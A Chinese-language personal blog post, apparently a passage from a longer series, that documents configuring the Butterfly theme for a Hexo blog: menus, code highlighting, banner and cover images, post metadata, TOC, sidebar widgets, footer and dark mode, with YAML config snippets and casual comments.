Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="comment"># Link: /link/ || fas fa-link</span></span><br><span class="line">  <span class="comment"># About: /about/ || fas fa-heart</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>必須是 /xxx/，後面||分開，然後寫圖標名。</p>
<p>如果不希望顯示圖標，圖標名可不寫。</p>
<p>默認子目錄是展開的，如果想要隱藏，在子目錄裏添加 hide 。导航前面的名字可以自己更改的</p>
<h2 id="3-代码高亮主题"><a href="#3-代码高亮主题" class="headerlink" title="3.代码高亮主题"></a>3.代码高亮主题</h2><p>总共有六种darker、pale night、light、ocean、mac、mac light</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br><span class="line"><span class="attr">highlight_copy:</span> <span class="literal">true</span> <span class="comment"># 代码复制功能</span></span><br><span class="line"><span class="attr">highlight_lang:</span> <span class="literal">true</span> <span class="comment"># show the code language</span></span><br><span class="line"><span class="attr">highlight_shrink:</span> <span class="literal">false</span> <span class="comment"># true: shrink the code blocks / false: expand the code blocks | none: expand code blocks and hide the button</span></span><br><span class="line"><span class="attr">highlight_height_limit:</span> <span class="literal">false</span> <span class="comment"># unit: px</span></span><br><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">true</span> <span class="comment">#设置代码自动换行，还需要到hexo config文件渲染那里设置line_number为true</span></span><br></pre></td></tr></table></figure>
<h2 id="4-社交图标"><a href="#4-社交图标" class="headerlink" title="4.社交图标"></a>4.社交图标</h2><p>没有设置呢 以后可能会设置一下。</p>
<h2 id="5-头像"><a href="#5-头像" class="headerlink" title="5.头像"></a>5.头像</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Favicon（網站圖標）</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/img/web/weblg.png</span></span><br><span class="line"><span class="comment"># Avatar (頭像)</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">img:</span> <span class="string">/img/web/head.png</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">false</span> <span class="comment">#这个设置为true的话会一直转圈圈~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p><u>插叙：设置了一下默认显示的代码块语言，可以搜索code language然后再设置以下代码：</u></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">code</span> <span class="string">language&quot;)+&quot;&#x27;&gt;&lt;/span&gt;&quot;,n.childNodes[0].textContent=t||&quot;yaml&quot;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="6-顶部图"><a href="#6-顶部图" class="headerlink" title="6.顶部图"></a>6.顶部图</h2><hr>
<p><u>又是插叙，忽然发现上传失败，搜索解决问题。</u></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">##修改</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">repo:</span> <span class="string">https://github.com/yourname/yourname.github.io.git</span> <span class="string">--&gt;git@github.com:a956551943/weixiaohui.github.io.git</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><u>更改后又能上传github</u></p>
<hr>
<p>頂部圖的獲取順序，如果都沒有配置，則不顯示頂部圖。</p>
<p>頁面頂部圖的獲取順序：</p>
<p>各自配置的 top_img &gt; 配置文件的 default_top_img</p>
<p>文章頁頂部圖的獲取順序：</p>
<p>各自配置的 top_img &gt; cover &gt; 配置文件的 default_top_img</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>配置</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>index_img</td>
<td>主頁的 top_img</td>
</tr>
<tr>
<td>default_top_img</td>
<td>默認的 top_img，當頁面的 top_img 沒有配置時，會顯示 default_top_img</td>
</tr>
<tr>
<td>archive_img</td>
<td>歸檔頁面的 top_img</td>
</tr>
<tr>
<td>tag_img</td>
<td>tag 子頁面 的 默認 top_img</td>
</tr>
<tr>
<td>tag_per_img</td>
<td>tag 子頁面的 top_img，可配置每個 tag 的 top_img</td>
</tr>
<tr>
<td>category_img</td>
<td>category 子頁面 的 默認 top_img</td>
</tr>
<tr>
<td>category_per_img</td>
<td>category 子頁面的 top_img，可配置每個 category 的 top_img</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>[!TIP]</p>
<p>其它頁面 （tags/categories/自建頁面）和 文章頁 的 top_img ，請到對應的 md 頁面設置front-matter中的top_img</p>
<p>tag_per_img 和 category_per_img 是 3.2.0 新增的內容，可對 tag 和 category 進行單獨的配置</p>
<p>並不推薦為每個 tag 和每個 category 都配置不同的頂部圖，因為配置太多會拖慢生成速度</p>
</blockquote>
<p>顺便一提我好像是一图流 感觉也没必要设置？还是说  嗯，果然没有必要</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable all banner image</span></span><br><span class="line"><span class="attr">disable_top_img:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of home page</span></span><br><span class="line"><span class="attr">index_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of page not setting, it will show the top_img</span></span><br><span class="line"><span class="attr">default_top_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of archive page</span></span><br><span class="line"><span class="attr">archive_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of tag page not setting, it will show the top_img</span></span><br><span class="line"><span class="comment"># <span class="doctag">note:</span> tag page, not tags page (子標籤頁面的 top_img)</span></span><br><span class="line"><span class="attr">tag_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of tag page</span></span><br><span class="line"><span class="comment"># format:</span></span><br><span class="line"><span class="comment">#  - tag name: xxxxx</span></span><br><span class="line"><span class="attr">tag_per_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the banner of category page not setting, it will show the top_img</span></span><br><span class="line"><span class="comment"># <span class="doctag">note:</span> category page, not categories page (子分類頁面的 top_img)</span></span><br><span class="line"><span class="attr">category_img:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of category page</span></span><br><span class="line"><span class="comment"># format:</span></span><br><span class="line"><span class="comment">#  - category name: xxxxx</span></span><br><span class="line"><span class="attr">category_per_img:</span></span><br></pre></td></tr></table></figure>
<h2 id="7-文章封面"><a href="#7-文章封面" class="headerlink" title="7.文章封面"></a>7.文章封面</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">cover:</span></span><br><span class="line">  <span class="comment"># display the cover or not (是否顯示文章封面)</span></span><br><span class="line">  <span class="attr">index_enable:</span> <span class="literal">true</span> <span class="comment">#主页</span></span><br><span class="line">  <span class="attr">aside_enable:</span> <span class="literal">true</span> <span class="comment">#侧栏</span></span><br><span class="line">  <span class="attr">archives_enable:</span> <span class="literal">true</span> <span class="comment">#归档页面</span></span><br><span class="line">  <span class="comment"># the position of cover in home page (封面顯示的位置)</span></span><br><span class="line">  <span class="comment"># left/right/both</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">both</span> <span class="comment">#left 全部显示在左边 right 你懂得 both 一左一右显示</span></span><br><span class="line">  <span class="comment"># When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span></span><br><span class="line">  <span class="attr">default_cover:</span> <span class="string">/img/web/default.png</span></span><br><span class="line">    <span class="comment"># - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span></span><br></pre></td></tr></table></figure>
<p>配置多项cover时，会随机选择一个，示例写法：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">default_cover:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg.png</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg2.png</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg3.png</span></span><br></pre></td></tr></table></figure>
<h2 id="8-页面meta显示"><a href="#8-页面meta显示" class="headerlink" title="8.页面meta显示"></a>8.页面meta显示</h2><p>显示文章的相关信息</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">page:</span> <span class="comment"># Home Page</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">created</span> <span class="comment"># created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 主頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">false</span> <span class="comment"># true or false 主頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br><span class="line">  <span class="attr">post:</span></span><br><span class="line">    <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment"># created or updated or both 文章頁日期是創建日或者更新日或都顯示</span></span><br><span class="line">    <span class="attr">date_format:</span> <span class="string">date</span> <span class="comment"># date/relative 顯示日期還是相對日期</span></span><br><span class="line">    <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示分類</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># true or false 文章頁是否顯示標籤</span></span><br><span class="line">    <span class="attr">label:</span> <span class="literal">true</span> <span class="comment"># true or false 顯示描述性文字</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没什么好改的  以后再看看~</p>
<h2 id="9-主页文章节选"><a href="#9-主页文章节选" class="headerlink" title="9.主页文章节选"></a>9.主页文章节选</h2><p>只支持自动节选和文章页description</p>
<blockquote>
<p>[!NOTE]</p>
<ol>
<li>description： 只顯示description</li>
<li>both： 優先選擇description，如果沒有配置description，則顯示自動節選的內容</li>
<li>auto_excerpt：只顯示自動節選</li>
<li>false： 不顯示文章內容</li>
</ol>
</blockquote>
<p>无视无视。</p>
<h2 id="10-页面锚点"><a href="#10-页面锚点" class="headerlink" title="10.页面锚点"></a>10.页面锚点</h2><p>关闭</p>
<h2 id="11-图片描述"><a href="#11-图片描述" class="headerlink" title="11.图片描述"></a>11.图片描述</h2><p>关闭</p>
<h2 id="12-复制相关配置"><a href="#12-复制相关配置" class="headerlink" title="12.复制相关配置"></a>12.复制相关配置</h2><p>配置复制内容是否加版权信息</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># copy settings</span></span><br><span class="line"><span class="comment"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span></span><br><span class="line"><span class="attr">copy:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#是否開啟網站複製權限</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="comment">#複製的內容後面加上版權信息</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span> <span class="comment">#是否開啟複製版權信息添加</span></span><br><span class="line">    <span class="attr">limit_count:</span> <span class="number">50</span> <span class="comment">#字數限制，當複製文字大於這個字數限制時，將在複製的內容後面加上版權信息</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>以后可以设置一下  现在就算了w</p>
<h2 id="13-文章页相关配置"><a href="#13-文章页相关配置" class="headerlink" title="13.文章页相关配置"></a>13.文章页相关配置</h2><h3 id="13-1-文章版权"><a href="#13-1-文章版权" class="headerlink" title="13.1.文章版权"></a>13.1.文章版权</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_copyright:</span> <span class="comment">#為你的博客文章展示文章版權和許可協議。</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">decode:</span> <span class="literal">false</span> <span class="comment">#中文网址会被默认解码，此处可设置 true</span></span><br><span class="line">  <span class="attr">author_href:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">4.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br></pre></td></tr></table></figure>
<p>從3.0.0開始，支持對單獨文章設置版權信息，可以在文章Front-matter單獨設置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">copyright_author:</span> <span class="string">xxxx</span></span><br><span class="line"><span class="attr">copyright_author_href:</span> <span class="string">https://xxxxxx.com</span></span><br><span class="line"><span class="attr">copyright_url:</span> <span class="string">https://xxxxxx.com</span></span><br><span class="line"><span class="attr">copyright_info:</span> <span class="string">此文章版權歸xxxxx所有，如有轉載，請註明來自原作者</span></span><br></pre></td></tr></table></figure>
<h3 id="13-2-文章打赏"><a href="#13-2-文章打赏" class="headerlink" title="13.2 文章打赏"></a>13.2 文章打赏</h3><p>无视。</p>
<h3 id="13-3-TOC"><a href="#13-3-TOC" class="headerlink" title="13.3 TOC"></a>13.3 TOC</h3><p>在文章頁，會有一個目錄，用於顯示TOC。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>属性</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>post</td>
<td>文章頁是否顯示 TOC</td>
</tr>
<tr>
<td>page</td>
<td>普通頁面是否顯示 TOC</td>
</tr>
<tr>
<td>number</td>
<td>是否顯示章節數</td>
</tr>
<tr>
<td>expand</td>
<td>是否展開 TOC</td>
</tr>
<tr>
<td>style_simple</td>
<td>簡潔模式（側邊欄只顯示 TOC, 只對文章頁有效 ）</td>
</tr>
<tr>
<td>scroll_percent</td>
<td>是否顯示滾動進度百分比</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># toc (目錄)</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">expand:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">style_simple:</span> <span class="literal">false</span> <span class="comment"># for post</span></span><br><span class="line">  <span class="attr">scroll_percent:</span> <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!NOTE]</p>
<p>為特定的文章配置<br>在你的文章md文件的頭部，加入toc_number和toc，並配置true或者false即可。</p>
<p>主題會優先判斷文章Markdown的Front-matter是否有配置，如有，則以Front-matter的配置為準。否則，以主題配置文件中的配置為準</p>
</blockquote>
<h3 id="13-4-相关文章"><a href="#13-4-相关文章" class="headerlink" title="13.4 相关文章"></a>13.4 相关文章</h3><p>相關文章推薦的原理是根據文章tags的比重來推薦</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Related Articles</span></span><br><span class="line"><span class="attr">related_post:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span> <span class="comment"># Number of posts displayed</span></span><br><span class="line">  <span class="attr">date_type:</span> <span class="string">created</span> <span class="comment"># or created or updated 文章日期顯示創建日或者更新日</span></span><br></pre></td></tr></table></figure>
<h3 id="13-5-文章过期提醒"><a href="#13-5-文章过期提醒" class="headerlink" title="13.5 文章过期提醒"></a>13.5 文章过期提醒</h3><p>可設置是否顯示文章過期提醒，以更新時間為基準。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">noticeOutdate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">flat</span> <span class="comment"># style: simple/flat</span></span><br><span class="line">  <span class="attr">limit_day:</span> <span class="number">500</span> <span class="comment"># 距离更新时间多少天</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span> <span class="comment"># position: top/bottom</span></span><br><span class="line">  <span class="attr">message_prev:</span> <span class="string">It</span> <span class="string">has</span> <span class="string">been</span> <span class="comment">#天数之前的文字</span></span><br><span class="line">  <span class="attr">message_next:</span> <span class="string">days</span> <span class="string">since</span> <span class="string">the</span> <span class="string">last</span> <span class="string">update,</span> <span class="string">the</span> <span class="string">content</span> <span class="string">of</span> <span class="string">the</span> <span class="string">article</span> <span class="string">may</span> <span class="string">be</span> <span class="string">outdated.</span></span><br><span class="line">  <span class="comment">#天数之后的文字</span></span><br></pre></td></tr></table></figure>
<h3 id="13-6-文章编辑按钮"><a href="#13-6-文章编辑按钮" class="headerlink" title="13.6 文章编辑按钮"></a>13.6 文章编辑按钮</h3><p>在文章標題旁邊顯示一個編輯按鈕，點擊會跳轉到對應的鏈接去。也就是所谓的在线编辑？没有什么必要吧w</p>
<h3 id="13-7-文章分页按钮"><a href="#13-7-文章分页按钮" class="headerlink" title="13.7 文章分页按钮"></a>13.7 文章分页按钮</h3><p>可以设置分页的逻辑，也可以关闭分页显示</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># post_pagination (分頁)</span></span><br><span class="line"><span class="comment"># value: 1 || 2 || false</span></span><br><span class="line"><span class="comment"># 1: The &#x27;next post&#x27; will link to old post</span></span><br><span class="line"><span class="comment"># 2: The &#x27;next post&#x27; will link to new post</span></span><br><span class="line"><span class="comment"># false: disable pagination</span></span><br><span class="line"><span class="attr">post_pagination:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="14-footer设置"><a href="#14-footer设置" class="headerlink" title="14.footer设置"></a>14.footer设置</h2><p>展示站点起始时间的选项，位于页面的最底部</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Footer Settings</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">owner:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">since:</span> <span class="number">2024.5</span> <span class="comment">#博客起点时间</span></span><br><span class="line">  <span class="attr">custom_text:</span> <span class="comment">#可在这里写ICP&lt;a href=&quot;icp鏈接&quot;&gt;&lt;img class=&quot;icp-icon&quot; src=&quot;icp圖片&quot;&gt;&lt;span&gt;備案號：xxxxxx&lt;/span&gt;&lt;/a&gt;</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="literal">true</span> <span class="comment"># Copyright of theme and framework</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="15-侧边栏设置"><a href="#15-侧边栏设置" class="headerlink" title="15. 侧边栏设置"></a>15. 侧边栏设置</h2><p>15.1 侧边排版</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">true</span> <span class="comment"># display on mobile</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span> <span class="comment"># left or right</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tag:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">category:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_author:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">description:</span></span><br><span class="line">    <span class="attr">button:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">fab</span> <span class="string">fa-github</span> <span class="comment">#以后有空来改一下你</span></span><br><span class="line">      <span class="attr">text:</span> <span class="string">哔哩哔哩</span> <span class="string">(゜-゜)つロ</span> <span class="string">干杯~</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://space.bilibili.com/13790196?spm_id_from=333.1007.0.0</span></span><br><span class="line">  <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">my</span> <span class="string">Blog</span></span><br><span class="line">  <span class="attr">card_recent_post:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">5</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort:</span> <span class="string">date</span> <span class="comment"># date or updated</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_categories:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">expand:</span> <span class="string">none</span> <span class="comment"># none/true/false</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_tags:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">40</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">color:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">orderby:</span> <span class="string">random</span> <span class="comment"># Order of tags, random/name/length</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_archives:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">monthly</span> <span class="comment"># yearly or monthly</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">MMMM</span> <span class="string">YYYY</span> <span class="comment"># eg: YYYY年MM月</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">-1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_webinfo:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">post_count:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">last_push_date:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_post_series:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">series_title:</span> <span class="literal">false</span> <span class="comment"># The title shows the series name</span></span><br><span class="line">    <span class="attr">orderBy:</span> <span class="string">&#x27;date&#x27;</span> <span class="comment"># Order by title or date</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">-1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="15-2-访问人数"><a href="#15-2-访问人数" class="headerlink" title="15.2. 访问人数"></a>15.2. 访问人数</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># busuanzi count for PV / UV in site</span></span><br><span class="line"><span class="comment"># 訪問人數</span></span><br><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!TIP]</p>
<p>如果需要修改 busuanzi 的 CDN 鏈接，可通過 主題配置文件 的 CDN 中的 option 進行修改</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">CDN:</span></span><br><span class="line">  <span class="attr">option:</span></span><br><span class="line">  	<span class="attr">busuanzi:</span> <span class="string">xxxxxxxxx</span></span><br></pre></td></tr></table></figure>
<p>嗯，就在最底下 有个CDN</p>
</blockquote>
<h3 id="15-3-运行时间"><a href="#15-3-运行时间" class="headerlink" title="15.3. 运行时间"></a>15.3. 运行时间</h3><p>关了，有点丑（bushi</p>
<h3 id="15-4-最新评论"><a href="#15-4-最新评论" class="headerlink" title="15.4. 最新评论"></a>15.4. 最新评论</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Aside widget - Newest Comments</span></span><br><span class="line"><span class="attr">newest_comments:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span></span><br><span class="line">  <span class="attr">storage:</span> <span class="number">10</span> <span class="comment"># unit: mins, save data to localStorage</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="15-5-自定义添加栏目"><a href="#15-5-自定义添加栏目" class="headerlink" title="15.5.自定义添加栏目"></a>15.5.自定义添加栏目</h3><p>以后再说</p>
<h2 id="16-右下角按钮"><a href="#16-右下角按钮" class="headerlink" title="16. 右下角按钮"></a>16. 右下角按钮</h2><h3 id="16-1-简繁转换"><a href="#16-1-简繁转换" class="headerlink" title="16.1 简繁转换"></a>16.1 简繁转换</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">translate:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># The text of a button</span></span><br><span class="line">  <span class="attr">default:</span> <span class="string">繁</span></span><br><span class="line">  <span class="comment"># the language of website (1 - Traditional Chinese/ 2 - Simplified Chinese）</span></span><br><span class="line">  <span class="attr">defaultEncoding:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># Time delay</span></span><br><span class="line">  <span class="attr">translateDelay:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment"># The text of the button when the language is Simplified Chinese</span></span><br><span class="line">  <span class="attr">msgToTraditionalChinese:</span> <span class="string">&#x27;繁&#x27;</span></span><br><span class="line">  <span class="comment"># The text of the button when the language is Traditional Chinese</span></span><br><span class="line">  <span class="attr">msgToSimplifiedChinese:</span> <span class="string">&#x27;簡&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="16-2-阅读模式"><a href="#16-2-阅读模式" class="headerlink" title="16.2 阅读模式"></a>16.2 阅读模式</h3><p>去除文章外的内容 ，开启</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">readmode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="16-3-夜间模式"><a href="#16-3-夜间模式" class="headerlink" title="16.3.  夜间模式"></a>16.3.  夜间模式</h3><p>右下角会有夜间模式按钮</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dark mode</span></span><br><span class="line"><span class="attr">darkmode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># dark mode和 light mode切換按鈕</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">autoChangeMode:</span> <span class="literal">false</span> <span class="comment">#自动切换的模式 1 跟随系统 2 按照时间切换 false取消自动切换</span></span><br><span class="line">  <span class="comment"># Set the light mode time. The value is between 0 and 24. If not set, the default value is 6 and 18</span></span><br><span class="line">  <span class="attr">start:</span> <span class="comment"># 8 开始时间</span></span><br><span class="line">  <span class="attr">end:</span> <span class="comment"># 22 结束时间</span></span><br></pre></td></tr></table></figure>
<h3 id="16-4-滚动状态百分比"><a href="#16-4-滚动状态百分比" class="headerlink" title="16.4 滚动状态百分比"></a>16.4 滚动状态百分比</h3><p>关掉，不太好看</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">rightside_scroll_percent:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="16-5-按钮顺序"><a href="#16-5-按钮顺序" class="headerlink" title="16.5 按钮顺序"></a>16.5 按钮顺序</h3><p>没有设置还是</p>
